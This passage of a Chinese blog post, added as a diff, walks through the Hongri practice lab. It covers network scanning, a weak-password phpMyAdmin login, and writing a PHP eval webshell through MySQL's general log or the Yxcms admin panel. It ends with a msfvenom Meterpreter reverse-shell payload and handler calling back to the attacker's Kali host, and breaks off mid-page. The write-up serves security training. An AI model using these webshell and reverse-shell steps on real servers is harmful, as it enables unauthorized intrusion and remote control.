@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>红日靶场 1 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="红日靶场 1">
+  <meta property="og:description" content="红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
+win7上要多添加一个桥接网卡可以分配一个真实ip
+三台靶机的默认开机密码都为hongrisec@2019
+win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
+win7提示重启，重启后打开phpstudy
+ipconfig查看
+可以看到分配的真实ip
+访问ip得到phpstudy探针，本机也可以
+同时我们需要保持外网、域网络防火墙为未开启状态
+02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
+80端口也就是刚才的phpstudy探针，可以看看有无利于点
+最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
+那去找一下mysql的后台登录页面，
+dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
+查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &#34;&lt;?php phpinfo();?&gt;&#34; ;
+访问刚才定义的日志页面 ，可以getshell
+传入shell ,连接蚁剑
+select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:52:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="红日靶场 1">
+  <meta name="twitter:description" content="红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
+win7上要多添加一个桥接网卡可以分配一个真实ip
+三台靶机的默认开机密码都为hongrisec@2019
+win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
+win7提示重启，重启后打开phpstudy
+ipconfig查看
+可以看到分配的真实ip
+访问ip得到phpstudy探针，本机也可以
+同时我们需要保持外网、域网络防火墙为未开启状态
+02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
+80端口也就是刚才的phpstudy探针，可以看看有无利于点
+最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
+那去找一下mysql的后台登录页面，
+dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
+查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &#34;&lt;?php phpinfo();?&gt;&#34; ;
+访问刚才定义的日志页面 ，可以getshell
+传入shell ,连接蚁剑
+select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" /><link rel="prev" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" /><link rel="next" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "红日靶场 1",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1\/"
+        },"genre": "posts","keywords": "","wordcount":  209 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1\/","datePublished": "2024-08-20T23:52:36+08:00","dateModified": "2024-08-20T23:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">红日靶场 1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;209 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#01环境配置">01环境配置</a></li>
+    <li><a href="#02信息收集">02信息收集</a>
+      <ul>
+        <li><a href="#探测内网存活">探测内网存活</a></li>
+        <li><a href="#nmap扫描端口">nmap扫描端口</a></li>
+        <li><a href="#dirsearch扫描目录">dirsearch扫描目录</a></li>
+        <li><a href="#查看日志权限">查看日志权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#03getshell">03Getshell</a>
+      <ul>
+        <li><a href="#利用日志文件getshell">利用日志文件getshell</a></li>
+        <li><a href="#yxcms后台登录getshell">Yxcms后台登录getshell</a></li>
+      </ul>
+    </li>
+    <li><a href="#msf上线">msf上线</a>
+      <ul>
+        <li><a href="#msf提权">msf提权</a></li>
+        <li><a href="#msf查看明文密码">msf查看明文密码</a></li>
+        <li><a href="#3389远程桌面连接">3389远程桌面连接</a></li>
+      </ul>
+    </li>
+    <li><a href="#msf隧道搭建-横向移动">msf隧道搭建 横向移动</a></li>
+    <li><a href="#cs上线">CS上线</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="红日靶场-1">红日靶场 1</h1>
+<h2 id="01环境配置">01环境配置</h2>
+<p>在 VMware 中选择虚拟网络编辑器设置内网网段<code>192.168.52.0/24</code>，NAT 和DHCP都要设置</p>
+<!-- raw HTML omitted -->
+<p>win7上要多添加一个桥接网卡可以分配一个真实ip</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912111824442.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912111824442.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912111824442.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912111824442.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912111824442.png"
+        title="image-20220912111824442" /></p>
+<p>三台靶机的默认开机密码都为<code>hongrisec@2019</code></p>
+<p>win7就用默认密码了 ，其他两个需要修改密码，我修改成<code>hongrisec@2022</code></p>
+<p>win7提示重启，重启后打开<code>phpstudy</code></p>
+<!-- raw HTML omitted -->
+<p><code>ipconfig</code>查看</p>
+<p>可以看到分配的真实ip</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912182154214.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912182154214.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912182154214.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912182154214.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912182154214.png"
+        title="image-20220912182154214" /></p>
+<p>访问ip得到phpstudy探针，本机也可以</p>
+<p>同时我们需要保持外网、域网络防火墙为未开启状态</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912112452804.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912112452804.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912112452804.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912112452804.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912112452804.png"
+        title="image-20220912112452804" /></p>
+<h2 id="02信息收集">02信息收集</h2>
+<h3 id="探测内网存活">探测内网存活</h3>
+<pre tabindex="0"><code>netdiscover -i eth0 -r 192.168.52.0/24
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912170721947.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912170721947.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912170721947.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912170721947.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912170721947.png"
+        title="image-20220912170721947" /></p>
+<h3 id="nmap扫描端口">nmap扫描端口</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912163640622.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912163640622.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912163640622.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912163640622.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912163640622.png"
+        title="image-20220912163640622" /></p>
+<pre tabindex="0"><code>nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000
+</code></pre><p>扫端口，可以利于80,3306</p>
+<p>80端口也就是刚才的phpstudy探针，可以看看有无利于点</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164010653.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164010653.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164010653.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164010653.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912164010653.png"
+        title="image-20220912164010653" /></p>
+<p>最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功</p>
+<p>那去找一下mysql的后台登录页面，</p>
+<h3 id="dirsearch扫描目录">dirsearch扫描目录</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164400856.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164400856.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164400856.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164400856.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912164400856.png"
+        title="image-20220912164400856" /></p>
+<p>可以看到不少phpmyadmin，找到后台 弱口令就登录进来了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164456322.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164456322.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164456322.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912164456322.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912164456322.png"
+        title="image-20220912164456322" /></p>
+<h3 id="查看日志权限">查看日志权限</h3>
+<pre tabindex="0"><code>show variables like &#39;general%&#39;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912165331363.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912165331363.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912165331363.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912165331363.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912165331363.png"
+        title="image-20220912165331363" /></p>
+<pre tabindex="0"><code>set global general_log= &#34;ON&#34;;  打开权限
+
+set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200232573.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200232573.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200232573.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200232573.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912200232573.png"
+        title="image-20220912200232573" /></p>
+<h2 id="03getshell">03Getshell</h2>
+<h3 id="利用日志文件getshell">利用日志文件getshell</h3>
+<p>sql语句执行 <code>select &quot;&lt;?php phpinfo();?&gt;&quot; ;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200205665.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200205665.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200205665.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200205665.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912200205665.png"
+        title="image-20220912200205665" /></p>
+<p>访问刚才定义的日志页面 ，可以getshell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200145662.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200145662.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200145662.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912200145662.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912200145662.png"
+        title="image-20220912200145662" /></p>
+<p>传入shell ,连接蚁剑</p>
+<pre tabindex="0"><code>select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912201739140.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912201739140.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912201739140.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912201739140.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912201739140.png"
+        title="image-20220912201739140" /></p>
+<h3 id="yxcms后台登录getshell">Yxcms后台登录getshell</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203052484.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203052484.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203052484.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203052484.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912203052484.png"
+        title="image-20220912203052484" /></p>
+<p>mysql后台看到有个newyxcms的数据库</p>
+<p>可以尝试访问，结果在/yxcms 出现新的站点</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203200166.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203200166.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203200166.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203200166.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912203200166.png"
+        title="image-20220912203200166" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203234201.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203234201.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203234201.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203234201.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912203234201.png"
+        title="image-20220912203234201" /></p>
+<p>甚至前端的公告信息就给了 后台地址和账号密码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203332422.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203332422.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203332422.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912203332422.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912203332422.png"
+        title="image-20220912203332422" /></p>
+<p>就顺利进入后台了 ，那么编辑一个php文件，传入shell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912204659479.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912204659479.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912204659479.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220912204659479.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220912204659479.png"
+        title="image-20220912204659479" /></p>
+<p>shell传入进去后，需要知道该文件的绝对路径，可以通过下载同版本的源码看目录结构来找路径</p>
+<pre tabindex="0"><code>http://192.168.1.103/yxcms/protected/apps/default/view/default/acomment.php
+</code></pre><p>成功getshell</p>
+<!-- raw HTML omitted -->
+<h2 id="msf上线">msf上线</h2>
+<p>生成win7木马</p>
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=kali_ip  LPORT=4444 -f exe -o shell.exe
+</code></pre><p>将生成的shell.exe 传到蚁剑上</p>
+<p>然后开启msf监听</p>
+<pre tabindex="0"><code>msfdb run
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp 
+set LHOST ip
+set LPORT 4444
+run
+</code></pre><p>蚁剑上执行 shell.exe</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652347.png"
